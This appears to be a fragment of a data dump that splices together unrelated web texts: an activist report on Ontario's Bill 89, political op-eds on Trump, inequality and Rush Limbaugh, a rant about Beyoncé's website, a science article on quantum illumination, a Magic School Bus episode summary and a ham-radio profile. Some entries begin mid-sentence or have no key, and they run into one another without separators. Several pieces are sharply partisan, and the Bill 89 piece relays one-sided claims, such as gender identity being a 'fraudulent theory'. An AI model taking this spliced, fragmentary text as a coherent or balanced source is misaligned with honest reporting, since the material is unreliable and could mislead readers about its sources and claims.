Michael Harris, and Steve Clark.\n\nPC leader Patrick Brown was not in the house for the vote.\n\nTrillium Party MPP Jack MacLaren also voted against the bill.\n\nA source present at a Tory caucus meeting two weeks ago told LifeSiteNews the Conservative members were swayed by “three or four” MPPs who said they could not in conscience vote for what the source described as a bill that is “fundamentally and morally wrong.”\n\nThe PC caucus, now at 28 members, thereupon decided to vote as a block against Bill 89, according to the source.\n\nFonseca lauded those PC MPPs who “came to their senses, stopped listening to that propagandist for Kathleen Wynne’s policies, and I do mean Patrick Brown, and chose to finally vote against tyranny.”\n\n“And thank God they did, because it serves as a symbol of resistance,” he said.\n\n“CLC had been directly lobbying MPPs to oppose the bill, and we believe that may have been a factor in why the PCs ended up voting en masse against it.”\n\nParents As First Educators and the Association for Reformed Political Action (ARPA) have also been at the forefront of relentless lobbying against the bill.\n\nBut despite these efforts, no Liberal broke ranks to vote on behalf of concerned parents, and a number of New Democratic Party MPPs voted for the bill as well.\n\nBill 89 retains the provision in current law that a child who is suffering or “at risk of suffering” mental or emotional harm and whose parents do not provide “treatment or access to treatment” is in need of protection under the law.\n\nBut while the former law said the Children’s Aid Society should take the “least disruptive course of action,” Bill 89 adds “including the provision of prevention services, early intervention services and community support services,\" according to an ARPA analysis.\n\n“The implication is that intervention should not be presumed to be more disruptive than non-intervention,” the ARPA report adds.\n\nStatements by Minister of Child and Family Services Michael Coteau clearly signaled the pro-LGBTQ, gender ideology Liberal agenda, critics warned.\n\nCoteau, who introduced the bill, told QP Briefing he sees questioning teenagers’ self-identification as LGBTQI or telling them to change as abuse.\n\n“I would consider that a form of abuse, when a child identifies one way and a caregiver is saying no, you need to do this differently,” he said.\n\n“If it’s abuse, and if it’s within the definition, a child can be removed from that environment and placed into protection where the abuse stops.”\n\nChildren’s Aid agencies now have “a type of police power to bust down your door, and seize your biological children if you are known to oppose LGBT ideology and the fraudulent theory of ‘gender identity', if for instance, some claim is made that your child may be same-sex attracted or confused about their ‘gender,’” according to Fonseca.\n\n“We already see similar tyranny happening in other jurisdictions, such as Norway, where the main child protection service there, Barnevernet, has been involved in numerous high profile seizures of children from traditionally-principled families,” he added.\n\nFonseca pointed out the Liberal bill gives legal cover for government workers to discriminate against Christians who want to adopt or foster children.\n\n“Even before Bill 89 was passed, but immediately after its introduction in December, I learned of several Christian couples who were turned down for adoption on account of their deeply held religious beliefs about traditional marriage and human sexuality,” he told LifeSiteNews.\n\nThis reveals the “stunning hypocrisy and anti-Christian bigotry” of the left, Fonseca said.\n\nThe Ontario court in 1995 ruled “for the first time in Canadian history that it was ‘discriminatory’ of the Child and Family Services Act to not allow homosexual couples to bring a joint application for adoption.”\n\nBut the “same activists who cried discrimination in 1995 [are] now actively legislating the same discrimination upon Bible-believing Christians, by banning them from having children through adoption,” Fonseca said.\n\n“Will the left never feel ashamed of its hypocrisy?”\n\nFonseca also issued a plea to Christian leaders, particularly the Catholic bishops.\n\n“Why has the most powerful spiritual body in this province, the Catholic hierarchy, not lifted a finger nor raised a voice to oppose this tyranny against Christian families, and those from other faiths?” Fonseca questioned.\n\n“The lack of spiritual leadership is killing us. Every single time that Liberals, either federally or provincially, roll out the LGBT juggernaut to take away our rights, or to demonize us as bigots, we hear nothing but silence from the Church. This has to stop.”\n\nMPPs who voted against Bill 89:\n\nPC Party: Ted Arnott; Bob Bailey; Toby Barrett; Steve Clark; Lorne Coe; Vic Fedeli; Ernie Hardeman; Michael Harris; Lisa MacLeod; Gila Martow; Jim McDonell; Monte McNaughton; Julia Munro; Rick Nicholls; Sam Oosterhoff; Randy Pettapiece; Todd Smith; Lisa Thompson; Bill Walker; Jim Wilson; John Yakabuski; Jeff Yurek.\n\nTrillium Party: Jack MacLaren\n\nPC MPPs absent for vote:\n\nPatrick Brown, Raymond Cho, Randy Hillier; Sylvia Jones; Norm Miller; Laurie Scott.\n\nMPPs who voted for Bill 89:\n\nLiberal Party: Laura Albanese; Granville Anderson; Yvan Baker; Chris Ballard; Lorenzo Berardinetti; James Bradley; Michael Chan; Bob Chiarelli; Mike Colle; Michael Coteau; Grant Crack; Steven Del Duca; Bob Delaney; Nathalie Des Rosiers; Vic Dhillon; Joe Dickson; Han Dong; Brad Duguid; Kevin Daniel Flynn; John Fraser; Jennifer French; Ann Hoggarth; Eric Hoskins; Mitzie Hunter; Helena Jaczek; Sophie Kiwala; Marie-France Lalonde; Jeff Leal; Tracy MacCharles; Harinder Malhi; Amrit Mangat; Cristina Martins; Deborah Matthews; Bill Mauro; Kathryn McGarry; Eleanor McMahon; Ted McMeekin; Peter Milczyn; Reza Moridi; Glen Murray; Indira Naidoo-Harris; Yasir Naqvi; Arthur Potts; Shafiq Qaadri; Lou Rinaldi; Liz Sandals; Charles Sousa; Harinder Takhar; Glenn Thibeault; Daiene Vernile; Soo Wong; Kathleen Wynne; David Zimmer.\n\nND Party: Gilles Bisson; Sarah Campbell; Catherine Fife; France Gélinas; Percy Hatfield; Paul Miller; Peggy Sattler; Peter Tabuns; Monique Taylor; John Vanthof.\n\nRELATED\n\nConservatives to oppose bill allowing gov’t to take kids from parents who reject transgenderism: source\n\n‘Totalitarian’: Ontario gov’t bill makes it easier to seize children from Christian homes, say critics\n\nLiberal bill empowers gvmt to take kids from Ontario parents who don’t accept gender ideology: legal experts",
  "latent_17486": "He is in a position to wreck retribution on the party, destroying it from within if he feels betrayed.\n\nFrom Trump’s point of view, the RNC jilting him would be seen as not just treason but also theft, since the party is raising money with his name. As Politico notes, “Trump himself declared Thursday that he’s doing more to boost the RNC’s coffers than the campaign is doing for him, and warned that he might back out of the joint fundraising arrangement.”\n\nIf he feels that the RNC is his enemy, and furthermore that he’s bound to lose, the Samson Option becomes viable. We got a glimpse of what the Samson Option would look like earlier in the campaign when Trump’s relationship with Republicans was fraying and he talked about withholding primary endorsements from Paul Ryan and John McCain. Of course, Trump and the RNC patched up their differences and he gave his endorsement anyway. But there’s nothing to stop Trump from repeating the exercise on a grand scale in the general election. If the Republican Party isn’t doing anything for him, why shouldn’t he tell his supporters not to vote GOP down-ballot?\n\nIn his final political act, Trump could combine self-defeat with defeat of the GOP as a whole, opening up all the party’s divisive wounds on the very eve of the election. The GOP’s betrayal would make it easier for him to say that the loss wasn’t his fault, instead caused by the very party that let him down and that he had to fight against. By falling out with the Republicans, Trump can lay the groundwork for a stabbed-in-the-back myth that will allow him to salvage his pride in defeat.\n\nOne ostensible flaw with the Samson analogy is that the Philistines were Samson’s enemies while the Republicans are part of Trump’s own party. But this misunderstands Trump’s relationship with the Republicans. From the start he’s been at war with the very party he now leads. He was happiest during the primaries when he was insulting Republican stalwarts like Jeb Bush. It’s striking that, although his foe is supposedly Hillary Clinton, he still seems most gleeful when talking about his victories over his Republican rivals, an aspect of his unlikely presidential campaign that he keeps returning to even though his task is now to unify the party.\n\nSamson was a creature of vengeance. As he was blinded and held captive, he cried out, “Sovereign Lord, remember me. Please, God, strengthen me just once more, and let me with one blow get revenge on the Philistines for my two eyes. Let me die with the Philistines!” Last fall, Trump uttered a wonderfully Samson-like sentiment about his rival Jeb Bush: “If I’m going down, then Bush is going down with me. He’s not going to be president of the United States.” Facing defeat in November, he could easily say, “Let me die with the Republican Party!”",

  "latent_17546": "iStockPhoto/© porcorex\n\nThis article originally appeared in The Huffington Post.\n\nOur current political situation is unprecedented. The vast majority of Americans keep falling behind economically because of changes in society's ground rules, while the rich get even richer—yet this situation doesn't translate into a winning politics.\n\nIf anything, the right keeps gaining and the wealthy keep pulling away. How can this possibly be?\n\nLet me suggest seven reasons:\n\n1. The Discrediting of Politics Itself\n\nThe Republican Party has devised a strategy of hamstringing government and making any remediation impossible. Instead of the voters punishing Republicans, the result is cynicism and passivity, so the Republican strategy is vindicated and rewarded.\n\nThe media plays into this pattern by adopting a misleading narrative that makes the gridlock in Washington roughly the equal fault of both parties—with lazy phrases such as \"Washington is broken,\" or \"politics is broken,\" or \"partisan bickering.\" (Do a Google search of those clichés. It will make you sick.)\n\nEminent political scientists such as Jacob Hacker, author of Off-Center, as well as Thomas E. Mann and Norman Ornstein (a self-described Republican) who co-authored It's Even Worse Than It Looks, have thoroughly debunked the premise of symmetrical blame. It's Republicans who are the blockers. But these scholars and their evidence fail to alter the media storyline, and the damage has been done.\n\nThe very people who have given up on politics, and on Democrats as stewards of a social compact that helps regular working people, are precisely those regular working people—who see the Dream getting away from them and government not helping.\n\n2. Compromised Democrats\n\nBut the Democrats are hardly blameless. Instead of seizing on the collapse of 2008 as a disgrace for laissez-faire economics, deregulation, Wall Street and the Republican Party, Barack Obama tried to make nice with the GOP, refrained from cleaning out the big banks that caused the mess, and drank the Kool-Aid of budget balance.\n\nThe result: Working people frustrated with economic backsliding had no party that really championed their interests. The fateful year 2008 may have been the worst missed moment for revolutionary reform in the history of the republic—and depending on who gets the Democratic nomination next time and what she does with it, 2016 could rival 2008 as a lost opportunity.\n\nRepublicans made big gains in the off-year elections of 2010 and 2014. Skeptical or cynical voters on the Democratic side (young people, poor people, African Americans, single women) are less likely to vote in off-years, while the right-wing base stays ferociously engaged. The more that potentially Democratic voters are disaffected, the more the right can block any progress on inequality.\n\n3. The Reign of Politicized Courts and Big Money\n\nThe Supreme Court's usual majority has become an opportunistic subsidiary of the Republican Party. Two key decisions, reflecting outrageous misreading of both the Constitution and the abuses of recent history, undermined citizenship and entrenched the rule of big money.\n\nIn the Citizens United case of 2010, the Court majority gave unlimited license to big personal and corporate money. And in the Shelby County v. Holder decision of 2013, the Court invalidated a key provision of the Voting Rights Act of 1965, declaring open season for a new era of voter suppression.\n\nAs a consequence, the potential role of invigorated democracy as the antidote to concentrated wealth has been weakened. Economic inequality translates into inequality of political influence.\n\n4. The Collapse of Equalizing Institutions\n\nDuring the postwar boom, America actually became more equal. The bottom quarter gained more income share than the top quarter. This was no historical or technological accident. Shared prosperity was built on government activism promoting opportunity, strong unions providing decent wages even for the less educated, enforcement of other labor laws, debt-free public higher education, well-regulated financial institutions, a genuinely progressive income tax, and a trading system that did not promote outsourcing.\n\nPolitics—not technology—caused the evisceration of these instruments. Politics could take back a fairer America.\n\n5. Bewildering Changes in How Jobs Are Structured\n\nIn the past couple of decades, regular payroll jobs with career prospects have increasingly been displaced by an economy of short-term gigs, contract work, and crappy payroll jobs without decent pay and benefits, or even regular hours. This shift often gets blamed on technology or education, but that's malarkey.\n\nWith a different political balance of forces, regular employees could not be disguised as contract workers; corporate executives could face felony convictions for wage theft; the right to unionize would be enforced; the windfall profits of the \"share economy\" would actually be shared with workers; large corporations like McDonalds could not pretend that the wages and working conditions in its franchises were somebody else's problem—and full employment would give workers more bargaining power generally.\n\n6. The Internalization of a Generation's Plight\n\nCompared to my age cohort, millennials are the screwed generation. The dream of homeownership has been undercut; good jobs with career prospects are in short supply; young adults begin economic life saddled with student debt; the pension system has been blown up; and if you want to have kids, society doesn't do anything to help the work-family straddle.\n\nYou'd expect young adults to be in the streets, but here the cynicism about politics blends with a natural inclination to make a virtue of necessity. Maybe I'll never own a home but I have to move around a lot anyway. I have all I need on my iPad, which means I'm less materialistic than my parents. And hey, I don't get to be a millionaire like the people who created Uber, but maybe I'll be an Uber driver, which is cool. Not to mention Airbnb.\n\nOn the other hand, the political leader who called for a one-time write off of all past student debt might still rally a lot of millennials. In the distribution of income and opportunity, a lot of questions that are actually political have been personalized and internalized. The assumption that we are all on our own is deeply political. But that can be changed.\n\n7. The Absence of a Movement\n\nIn the face of all these assaults on the working and middle class, there are many movements but no Movement. The Occupy movement, which gave us the phrase, \"the 1 percent,\" was too hung up on its own procedural purity to create a broad movement for economic justice.\n\nLooking out at the plethora of local and national groups pursuing greater economic equality, one sees mainly idealism and fragmentation.\n\nSome of it is caused by that dread code, 501(c)3. Well-meaning foundations fall in love with the charismatic activist leader du jour, seem intent on creating yet another grassroots group or coalition, and then that group needs to differentiate itself from rivals and dance to the foundation's tune. (This is a column for another day.)\n\nThe remedies that would restore economic opportunity and security to ordinary Americans are far outside mainstream political conversation, and will not become mainstream until forced onto the agenda by a genuine mass movement. Sometimes that movement gets lucky and finds a rendezvous with a sympathetic national leader.\n\nThis has occurred before—in the Roosevelt revolution of the 1930s and the Civil Rights revolution of the 1960s. But without a potent movement on the ground, mainstream electoral politics is likely to remain stuck with remedies too weak either to rouse public imagination and participation, or to provide more than token relief for today's extreme inequality.\n\nThis vicious circle—really a downward spiral about depressed expectations and diminished participation—can be reversed, as it has been reversed at moments in the American past. As that noted political consultant Joe Hill put it when he was condemned to the gallows, \"Don't mourn, organize.\"",

What can be done in 48 hours? About as much of the full-length album she can finish in 48 hours… make that a quality album.\n\nEven if the end result is a beautifully designed website, it won’t accomplish what she’s asking for. Beyoncé doesn’t need a pretty website; she needs an effective and engaging one.\n\nAs designers and marketers, we’re a little insulted. The agencies she’s requesting bids from are more than likely staffed with directors and designers that have devoted their lives as well as their massive student loan debt to the very medium she thinks can be easily tackled in two days.\n\nWe are students for life in this field and apparently we’re the only ones that appreciate that.\n\nThe rebranding that Beyoncé needs will take as much time and attention as her concerts. The same effort will need to be put into her social channels which may as well be non-existent.\n\nHer Facebook is nothing but promotion while her Twitter page has ZERO tweets but over 2 million eager fans.\n\nWhere is the woman that likes fashion and art and photography and travel? She’s requesting ridiculousness, maybe it’s the pregnancy?",
  "latent_17848": "“Spooky action at a distance” is how Albert Einstein famously derided the concept of quantum entanglement—where objects can become linked and instantaneously influence one another regardless of distance. Now researchers suggest that this spooky action in a way might work even beyond the grave, with its effects felt after the link between objects is broken.\n\nIn experiments with quantum entanglement, which is an essential basis for quantum computing and cryptography, physicists rely on pairs of photons. Measuring one of an entangled pair immediately affects its counterpart, no matter how far apart they are theoretically. The current record distance is 144 kilometers, from La Palma to Tenerife in the Canary Islands.\n\nIn practice, entanglement is an extremely delicate condition. Background disturbances readily destroy the state—a bane for quantum computing in particular, because calculations are done only as long as the entanglement lasts. But for the first time, quantum physicist Seth Lloyd of the Massachusetts Institute of Technology suggests that memories of entanglement can survive its destruction. He compares the effect to Emily Brontë’s novel Wuthering Heights: “the spectral Catherine communicates with her quantum Heathcliff as a flash of light from beyond the grave.”\n\nThe insight came when Lloyd investigated what happened if entangled photons were used for illumination. One might suppose they could help take better pictures. For instance, flash photography shines light out and creates images from photons that are reflected back from the object to be imaged, but stray photons from other objects could get mistaken for the returning signals, fuzzing up snapshots. If the flash emitted entangled photons instead, it would presumably be easier to filter out noise signals by matching up returning photons to linked counterparts kept as references.\n\nStill, given how fragile entanglement is, Lloyd did not expect quantum illumination to ever work. But “I was desperate,” he recalls, keen on winning funding from a Defense Advanced Research Projects Agency’s sensor program for imaging in noisy environments. Surprisingly, when Lloyd calculated how well quantum illumination might perform, it apparently not only worked, but “to gain the full enhancement of quantum illumination, all entanglement must be destroyed,” he explains.\n\nLloyd admits this finding is baffling—and not just to him. Prem Kumar, a quantum physicist at Northwestern University, was skeptical of any benefits from quantum illumination until he saw Lloyd’s math. “Everyone’s trying to get their heads around this. It’s posing more questions than answers,” Kumar states. “If entanglement does not survive, but you can seem to accrue benefits from it, it may now be up to theorists to see if entanglement is playing a role in these advantages or if there is some other factor involved.”\n\nAs a possible explanation, Lloyd suggests that although entanglement between the photons might technically be completely lost, some hint of it may remain intact after a measurement. “You can think of photons as a mixture of states. While most of these states are no longer entangled, one or a few remain entangled, and it is this little bit in the mixture that is responsible for this effect,” he remarks.\n\nIf quantum illumination works, Lloyd suggests it could boost the sensitivity of radar and x-ray systems as well as optical telecommunications and microscopy by a millionfold or more. It could also lead to stealthier military scanners because they could work even when using weaker signals, making them easier to conceal from adversaries. Lloyd and his colleagues detailed a proposal for practical implementation of quantum illumination in a paper submitted in 2008 to Physical Review Letters building off theoretical work presented in the September 12 Science.\n\nActually proving this effect may be the real challenge. The easy part is creating entangled photons: just shoot light through a special, “downconverting” crystal that acts as a beam splitter; it produces separate yet linked rays. One ray illuminates the object, and the other serves as a reference. The returning and reference beams then are merged together (basically, by making them go through a splitter in reverse); the photons that were entangled should be more likely to recombine, or “upconvert.” But any experiment to prove that quantum illumination can boost the sensitivity of imaging has to use weak signals, and creating materials capable of upconverting faint beams with high efficiency is technically daunting, Kumar says. Still, Lloyd predicts experimental tests of this scheme might come later this year.\n\nBesides boosting imaging sensitivity, the effect might confer benefits on quantum computing or quantum cryptography, Kumar suspects. “The quantum world is quite exotic and complex, and this shows there are surprises there that lurk around corners all the time,” he says.\n\nNote: This article was originally printed with the title, \"Quantum Afterlife\".",

Bastien Guest Star(s) Sherman Hemsley Prev Next In a Pickle Taking Flight\n\n\"Revving Up\" is the eighth episode of season two and the twenty-first episode overall of the animated children's series The Magic School Bus. It originally aired on November 26th, 1995.\n\nContents show]\n\nPlot\n\nMr. Junkett, a vehicle maintenance inspector, isn't pleased when he inspects The Magic School Bus. So he tells Ms. Frizzle that The Magic School Bus is going to the junk yard to have it condemned. To prove that The Magic School Bus is fine, Ms. Frizzle and the class take him on a drive, in which it eventually breaks down after a ride around the hill. When Ms. Frizzle fails to find the problem of the engine, Mr. Junkett finally condemns The Magic School Bus. He leaves to get a tow truck, and Ms. Frizzle and the class don bodysuits and then shrink and go inside The Magic School Bus to follow the gas to the engine find out the problem. They make it inside the gas tank and the class wonder how they will get from there to the engine. Ms. Frizzle inflates a duck raft and the class row through the fuel system. Little do they know, however, Mr. Junkett is on his way with a tow truck ready to take The Magic School Bus to the junkyard.\n\nMeanwhile, back inside The Magic School Bus, Ms. Frizzle tells Liz through the screen monitor that she and the rest of the class are moving out of the fuel tank and into the fuel line, only to come across a sticky substance. They eventually find out it is peanut butter and was from the peanut butter sandwich Mr. Junkett was eating while inspecting The Magic School Bus' engine. When the class clear the pipe, the gas begins flowing and Liz turns the key to start the engine, sending the class into the fuel pump leading them to the carburetor. When the engine still doesn't start, the class discover an opening overhead and learn that it takes air for things to burn and the engine needs gas and air to run since the running engine burns gas. The class then learn that it was Mr. Junkett's peanut butter sandwich covering the opening.\n\nWith the tow truck getting closer, they move the sandwich (and almost Arnold) off the top of the carburetor, only for the tow truck to attempt to tow The Magic School Bus. Liz desperately turns the key and everyone inside the engine float around the air. The class (with the exception of Arnold) fall into the valve leading to the cylinder Liz watches the screen nervously as the class heads to the cylinder which leads to her to hide under the bus meanwhile outside, Arnold wonders where everybody went but is almost caught while Mr. Junkett examines the engine one last time. The tow truck starts up and tows The Magic School Bus away with it leaving Mr. Junkett behind, Mr. Junkett tries to catch up to it as it drives around the mountain but a car comes out of nowhere and he jumps out it's way but ends up rolling off a edge of a hill then left hanging on to a root.\n\nDuring the tow to the junkyard, Liz is still hiding under The Magic School Bus, and Arnold, who is still out on the engine informs the class, that The Magic School Bus is being towed away and Liz is informed by this once she makes it back inside the bus after crawling from under it Ms. Frizzles orders for Liz to turn the key, just as Liz is about to do so, she collapses due to exhaustion. The tow truck makes it into the junkyard and The Magic School Bus is prepared to be crushed. It is hoisted by the crane and lands in between the car crusher. Arnold tells the class if they don't get out, they will be smashed Ms Frizzle tells Liz she needs to turn the key, Liz turns the key and steps on the gas pedal which makes the piston move. Keesha smells the gas entering the cylinder Ms. Frizzle tells the class that what goes down must go up when it comes to engine pistons Ms. Frizzle tells the class the cylinder is where 3 ingredients come together in order to get the engine started. When the bus is about to get crushed, the class then learns that the engine burns gas and have to find a way to get it to burn. Dorothy Ann reads in her book that gasoline burns very easily, so one should be careful around it. Wanda then learns that the three ingredients of a running engine are gas, air, and a spark. The class then learn that it was the peanut butter that was keeping the spark plug from running. So Carlos cleans out the spark plug (only to for the peanut butter to stick onto him) and the class ends up going through the exhaust pipe and the metallic maze known as The Muffler.\n\nThe class exit the exhaust pipe and grow into their normal human size just in time to notice the huge block suspended from a rope about to crush The Magic School Bus. Liz starts the engine and The Magic School Bus transforms into a hot rod. The Magic School Hot Rod drives away right before the block crashes down, with the rest of the class taking a ride. They thank Liz for saving The Magic School Bus from being crushed and find that Arnold in still shrunken in size, Liz activates the screen as he falls inside the carburetor, through the cylinder, and finally exiting the exhaust pipe right before growing back to his normal, human size.\n\nThe class later save Mr. Junkett from falling off the edge of the mountain with a crane from The Magic School Bus transformed into a tow truck. Ms. Frizzle transforms The Magic Tow Truck back into its regular appearance and Mr. Junkett apologizes to Ms. Frizzle and the class. Ms. Frizzle also states that, \"A good engine is worth the price of ignition\". The Magic School Bus then drives to Mr. Junkett's speech afterwards.\n\nTransformations The Magic School Bus Used\n\nHot Rod\n\nTow Truck\n\nQuotes\n\nTrivia/Goofs\n\nWhen Liz was hiding under The Magic School Bus, her eyes are white instead of yellow.\n\nCarlos does not say any puns in this episode.\n\nPhoebe does not say \"At my old school...\" in this episode.\n\nDorothy Ann does not have her book bag in this episode, however, she is seen holding a book in a later scene in the cylinder.\n\nWhen The Magic School Bus was being towed away, the doors could be seen on both sides.\n\nIn a couple scenes Arnold could be spotted even though he was out on the engine telling the class what was going on (similar to \"For Lunch\").\n\nWhen the class is heading for the valve that leads to the exhaust system, Phoebe's gloves change from red to yellow.\n\nIn one scene in the carburetor, Ralphie's gloves were red and Phoebe's suit keeps flashing to the color of his.\n\nWhen Ralphie is asking where Liz is, his hat is missing.\n\nWhen Carlos gets the peanut butter off the spark plug, he has some on his suit but in the next shot, it disappears.\n\nWhen Keesha asks \"Just how big is this fire going to be?\", Phoebe is in Dorothy Ann's suit.\n\nIn some scenes when the class was in the cylinder, the gas and air would disappear in between shots.\n\nThe class' suits are color-coded (except Ms. Frizzle's) and do not have the school logo.\n\nWhen the suits come down from the ceiling of the bus, Tim's was not shown.\n\nMr. Junkett puts a \"CONDEMNED\" banner on The Magic School Bus but in later scenes, it is gone. It may have fallen off later on.\n\nWhen Carlos says \"Line's clear, Ms. Frizzle!\", his suit is the same color as Ralphie's and Dorothy Ann's gloves are pink.\n\nIf you look carefully at the top of the screen when Arnold hides behind the spark plug, Mr. Junkett is not wearing his hat.\n\nRalphie's head is noticeably twitching while brushing himself after the class comes out of the engine.\n\nWhen the class falls off their stack and tell Arnold to look out, Ralphie and Tim can be seen falling through the carburetor valve even though it was shut.\n\nIn some scenes before the class went inside The Magic School Bus' engine, the hood would be closed or open in some shots.\n\nIn one scene when the piston was going down, Ralphie, Tim, and Dorothy Ann are missing.\n\nIn one scene as the class falls through the exhaust pipe, Wanda and Carlos are nowhere to be seen.\n\nAt the end of the episode, Liz is nowhere to be seen when Mr. Junkett gets on the bus.\n\nIt is revealed that Arnold hates the smell of gasoline.\n\nThis is one of the few episodes that has never been released on VHS. However, a DVD was made in 2014.\n\nInstead of the usual bus-shaped blinking light on the monitor to show where the class is, a blinking circle is shown due to the class being inside The Magic School Bus' engine.\n\nThis is the last episode to air before Halloween.\n\nAt the beginning of the episode, if you look real carefully, an invisible screw and bolt can be seen on the ground in the shot with Liz looking under the bus.\n\nWhen Mr. Junkett says that The Magic School Bus looks like it got hit by a meteorite, he's referencing when The Magic School Bus got hit by an asteroid in Gets Lost in Space!\n\nWhen Dorothy Ann wears her bodysuit along with the rest of class, her hair turns dishwater blonde.\n\nThis is one of the few times where the bus had been referred to by the name of the franchise.\n\nGoing by production order, this is the 7th episode of Season 2.\n\nGallery\n\nWatch Episode",
  "latent_18210": "When the lights go dark, telephones are silenced and disaster is in the air, Charlie Ristorcelli is the guy you want to know.\n\nThe 67-year-old Poway resident is a ham-radio enthusiast whose passion for that old-school but increasingly high tech form of communication provides him a with front-row seat, and potentially an important voice, in any catastrophe.\n\nOver the years, Ristorcelli has spent roughly $75,000 buying and building equipment — including a 35-foot antenna in his front yard — that allows him to communicate with millions of other ham-radio operators worldwide.\n\nBut even amid a sea of ham-radio geeks, Ristorcelli — or NN3V, as he’s known on the airwaves — is a breed apart.\n\nA retired Navy captain, he was commanding officer of an electronics systems engineering center responsible for the Navy’s worldwide communication system. During the final stretch of his 35-year career he oversaw the Navy’s afloat and ashore surveillance network. He has written books and put time in with the National Security Agency, a stint he says he can’t talk about.\n\nNow, from his home in Poway, he interacts with people all over the world using Morse code, high-frequency radio bands and various other forms of radio communication that keep getting more sophisticated as the world of ham radios and the Internet meld together.\n\nOver the years, Ristorcelli’s logs show, he has made contact with roughly 19,000 different people around the globe — quiet a feat for a self-described introvert.\n\nA 35 foot antenna points skyward outside of Charlie Ristorcelli's home. Charlie Ristorcelli is the president of the Poway Amateur Radio club and has been an expert in the craft for over 30 years, including time served in the Navy and with NSA. Ristorcelli has a sophisticated system established in his Poway home that allows him to make radio communications around the globe. A 35 foot antenna points skyward outside of Charlie Ristorcelli's home. Charlie Ristorcelli is the president of the Poway Amateur Radio club and has been an expert in the craft for over 30 years, including time served in the Navy and with NSA. Ristorcelli has a sophisticated system established in his Poway home that allows him to make radio communications around the globe.\n\n“Being on the radio talking to somebody (is a) piece of cake,” he said. “I don’t have to see them, but I can talk to them, and we have a good time.”\n\nCrisis communicators\n\nIn North County, Ristorcelli is also a leader in the Poway Amateur Radio Society, a loose-knit group of enthusiasts who share a passion for ham radio.\n\nEvery Saturday morning, members meet for breakfast at a local restaurant called the Hamburger Factory. (They insist they didn’t chose the location because “ham” is part of its name, but one wonders if it wasn’t at least subliminal.)\n\nTheir conversations get technical quickly. To an outsider, it’s somewhat like a foreign language.\n\nFor years, the group has been trying to get Poway to ease antenna height restrictions, a battle they appear to be winning. Last month, the City Council directed its staff to create a new ordinance allowing antennas of up to 65 feet — up from the current 35 feet — and making antenna permits easier to obtain.\n\nThe society has also has formed the Poway Amateur Communications Team, which is working with the city to provide backup ham radio communications during emergencies.\n\nEach Tuesday night, the team comes together over the air waves to practice how they would go about communicating during a big fire, earthquake, or other disaster that might knock out power or inundate local cellphone systems.\n\nThey talk by bouncing waves off various mountaintop repeaters located around the county and by direct communication between two users.\n\nOne of the reasons the group wants antenna heights raised is that it would allow for more direct communication in case the repeaters go down.\n\n“We try to cover all bases and plan for any contingency that might happen,” said team participant Mike Binder, or NA6MB. “We try to be prepared.”\n\nReal-world application\n\nThat philosophy paid off in 2005 when Ristorcelli — at home in Poway — picked up a plea on his radio from victims of Hurricane Katrina in New Orleans and jumped in to help.\n\n“I was here playing on the radio like I am right now, and I heard some guys in Lake Pontchartrain on the high frequency band asking for help,” he said. “They were in a crisis, and I heard them in Poway. So I called the Coast Guard and gave them the location of the guys and they sent a rescue boat out to get them off the island where they were stranded. That’s emergency communications. That’s why you need HF.”\n\nBecause they are devoted, most hams operate frequently, Ristorcelli said. They practice their skills and ensure their equipment is fully operational every day of the week, not just during structured and scheduled communication tests.\n\nHe said many hams have diverse interests and develop thousands of special skills that contribute to instant availability of equipment and techniques independent of other resources.\n\n“Hams have no expectation that the ‘IT department’ will come fix the misbehaving computer, or that an electrician will set up the power sources, or a repair expert will arrive to take care of failed equipment,” he said.\n\nBeyond disaster response, most hams are primarily hobbyists. Many enter contests designed to maximize the number of contacts they make and proudly hang certificates when they reach various milestones.\n\nAnd sometimes they make good friends.\n\n“VP8LP, he’s Bob in the Falkland Islands,” Ristorcelli said. “Last year when my wife and I did a South American cruise, the ship stopped at the Falklands and he hosted us for the time we were there, showed us around the town, fed us, showed us the things that were nice to do. I’ve (experienced) the same thing in Italy and England.\"",

  "latent_18231": "In June of 2006, nationally syndicated radio host Rush Limbaugh on his way back from the Dominican Republic, was caught with a prescription bottle (not in his name) filled with the erectile dysfunction drug Viagra. By fall, 2006 Details Magazine pronounced that \"Limbaugh\" was the new slang for the drug. As in, \"I just popped a Limbaugh. Now what do I do?\"\n\nSo isn't it now fitting that Limbaugh has become the de facto voice for an increasingly impotent Republican Party?\n\nLike Viagra, Limbaugh gets a temporary surge of controversy - a boost in rhetoric. Side effects include dizziness, irrational hatred of liberals and erratic knee jerks.\n\nHere's the thing, we're in real trouble. As far as our economy goes - it's bad. All the eggheads tell us so. Plus you can drive down the street and take stock of all the going out of business and foreclosure signs to draw your own independent conclusions.\n\nWe just endured eight years of Bush economics; cut taxes, dissolve regulation and increase spending to record levels. On January 30, 2009 Bloomberg News reported that the top 400 wealthiest people in the US paid a quarter less taxes than before and their wealth doubled under the Bush presidency. There's supply-side economics. That's trickle down.\n\nIt's also simple physics - when things are too top heavy they topple. Just as they did the last year of the Bush Administration.\n\nBut to hear it from Bush's perspective it was all baddies on Wall Street that buckled the economy. \"The SEC is also requiring certain investors to disclose their short selling, and has launched rigorous enforcement actions to detect fraud and manipulation in the market. Anyone engaging in illegal financial transactions will be caught and persecuted (sic).\" Bush said at the White House last September.\n\nThis is not surprising because with Bush it was always rogue individuals at fault (Scooter Libby) and never those in charge (Karl Rove). Those vilified Wall Street people may have pillaged the world economy but it was mostly legal. Buccaneers had a note from the King - it didn't make them any less of pirates. Their legality meant the King was palling around with...well Wall Street types.\n\nRemember this is the manifestation of conservative ideals: free market capitalism. The free market - it sounds so liberated from those horrible killjoy laws and regulations. Free at last! Conservatives got their way and now we can see its aftermath all around us.\n\nAnd Limbaugh wants to see President Obama fail? The guy that touted all of Bush's policies and 'ideas' unequivocally for eight years? How many times do you let someone sell you a lemon before you stop buying from him? (author's note: I was going to say 'sell you bunk Oxycodone', too cheap?)\n\nLook, we already saw President Bush fail. His sweeping, unchecked, unprecedented follies have come to fruition.\n\nThe only idea that Republicans can come up with in this unparalleled crisis is to call for more tax cuts. Senator Kay Bailey Hutchinson (R-Texas) on Meet the Press last Sunday declared she opposed the recovery plan that passed in the House because of the massive stimulative spending. \"On the other hand, on tax cuts, I think tax cuts should be strong, I think they should be a lot and I think they should be something that will have an impact.\" Offered Senator Hutchinson.\n\nImpact?

